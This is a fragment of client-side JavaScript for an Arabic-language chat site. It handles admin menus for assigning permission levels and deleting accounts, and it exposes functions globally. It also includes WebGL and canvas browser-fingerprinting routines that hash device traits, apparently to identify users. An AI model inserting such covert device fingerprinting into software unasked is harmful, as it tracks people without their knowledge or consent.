                        for (var i = 0; i < activeAlerts.length; i++) {
                            optionsMap['[' + activeAlerts[i].rank.toString().padStart(4, '0') + "] " + activeAlerts[i].name] = activeAlerts[i].name;
                            optionsList.push('[' + activeAlerts[i].rank.toString().padStart(4, '0') + "] " + activeAlerts[i].name);
                        }
                        optionsList.sort(function (a, b) {
                            return b.localeCompare(a);
                        });
                        openContextMenu(_0x100283, optionsList, function (selectedPower) {
                            if (selectedPower == "سحب الصلاحيه") {
                                send('cp', {
                                    'cmd': "setpower",
                                    'id': userId,
                                    'days': 0,
                                    'power': ''
                                });
                            } else {
                                if (selectedPower == "البحث") {
                                    var searchQuery = prompt("البحث في الصلاحيات.\n اكتب اسم الصلاحيه", '');
                                    if (searchQuery != null) {
                                        optionsList = [];
                                        optionsMap = {};
                                        for (var j = 0; j < activeAlerts.length; j++) {
                                            var powerItem = activeAlerts[j];
                                            if (powerItem.name.indexOf(searchQuery) != -1 || powerItem.rank == searchQuery) {
                                                optionsMap['[' + activeAlerts[j].rank.toString().padStart(4, '0') + "] " + activeAlerts[j].name] = activeAlerts[j].name;
                                                optionsList.push('[' + activeAlerts[j].rank.toString().padStart(4, '0') + "] " + activeAlerts[j].name);
                                            }
                                        }
                                        optionsList.sort(function (a, b) {
                                            return b.localeCompare(a);
                                        });
                                        openContextMenu(_0x100283, optionsList, function (selectedFiltered) {
                                            var subscriptionDays = parseInt(prompt("مده الإشتراك؟ 0 = دائم", '0') || '0');
                                            send('cp', {
                                                'cmd': "setpower",
                                                'id': userId,
                                                'days': subscriptionDays,
                                                'power': optionsMap[selectedFiltered]
                                            });
                                        });
                                    }
                                } else {
                                    var subscriptionDays = parseInt(prompt("مده الإشتراك؟ 0 = دائم", '0') || '0');
                                    send('cp', {
                                        'cmd': "setpower",
                                        'id': userId,
                                        'days': subscriptionDays,
                                        'power': optionsMap[selectedPower]
                                    });
                                }
                            }
                        });
                        break;
                    case "حذف العضويه":
                        send('cp', {
                            'cmd': 'delu',
                            'id': userId
                        });
                        $(_0x100283).remove();
                        break;
                }
            });
        }

        // ============================================================
        // تعريض الدوال المطلوبة من HTML للنطاق العالمي window
        // (لأن جميع الدوال داخل IIFE وغير مرئية للأحداث في الـ HTML)
        // ============================================================


function executeGnFingerprint() {
  try {
    var c = document.createElement("canvas");
    c.width = 16; c.height = 16;
    var ctx = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!ctx) return hashFingerprintString("nowebgl");
    return hashFingerprintString(ctx.getParameter(ctx.RENDERER) + ctx.getParameter(ctx.VENDOR));
  } catch(e) { return hashFingerprintString("err"); }
}

// دالة بصمة canvas عامة
function executeGgFingerprint() {
  try {
    var c = document.createElement("canvas");
    c.width = 200; c.height = 50;
    var ctx = c.getContext("2d");
    ctx.textBaseline = "top";
    ctx.font = "14px Arial";
    ctx.fillStyle = "#f60";
    ctx.fillRect(0,0,200,50);
    ctx.fillStyle = "#069";
    ctx.fillText("fingerprint", 2, 15);
    return hashFingerprintString(c.toDataURL());
  } catch(e) { return hashFingerprintString("err"); }
}


        window.load = load;
        window.login = login;
        window.logout = logout;
        window.send = send;
        window.Tsend = Tsend;
        window.sendbc = sendbc;
        window.sendpic = sendpic;
        window.setprofile = setprofile;
        window.mkr = mkr;
        window.redit = redit;
        window.rjoin = rjoin;
        window.muteAll = muteAll;
        window.pmsg = pmsg;
        window.upro = upro;
        window.tmic = tmic;
        window.openw = openw;
        window.wclose = wclose;
        window.reply = reply;
        window.gift = gift;
        window.ubnr = ubnr;
        window.ytube = ytube;
        window.closex = closex;
        window.showcp = showcp;
        window.roomspic = roomspic;
        window.pickedemo = pickedemo;
        window.sendfilea = sendfilea;
        window.bkdr = bkdr;
        window.del_ico = del_ico;
        window.emo_order = emo_order;
        window.fltrit = fltrit;
        window.cp_powers = cp_powers;
        window.cp_fps = cp_fps;
        window.cp_fps_do = cp_fps_do;
        window.cp_bots = cp_bots;
        window.cp_ledit = cp_ledit;
        window.sett_save = sett_save;
        window.domains_save = domains_save;
        window.s_sico = s_sico;
        window.fixSize = fixSize;
        window.openPopupDialog = openPopupDialog;
        window.openAdminPopupDialog = openAdminPopupDialog;
    window.hashFingerprintString = hashFingerprintString;
    window.showNotificationToast= showNotificationToast;
window.initializeSocketConnection= initializeSocketConnection;
    window.executeGnFingerprint = executeGnFingerprint;
window.executeGgFingerprint = executeGgFingerprint;
window.updateusers = updateusers;
      window.msg = msg;             
        window.pm = pm;               
        window.bc = bc;               
        
        // دوال التحكم في الغرف والمايك
        window.rjoin = rjoin;         
        window.mic = mic;             
        window.upro = upro;           
        
        // دوال تسجيل الدخول والتسجيل
        
        window.reg = reg;             
        
        // دوال إدارة واجهة المستخدم
        window.compileRoomRowHtml = compileRoomRowHtml; 
        window.compileUserRowHtml = compileUserRowHtml;
        window.closePopupDialog = closePopupDialog;
        
    })();
console.log("السكربت تم تحميله بنجاح");
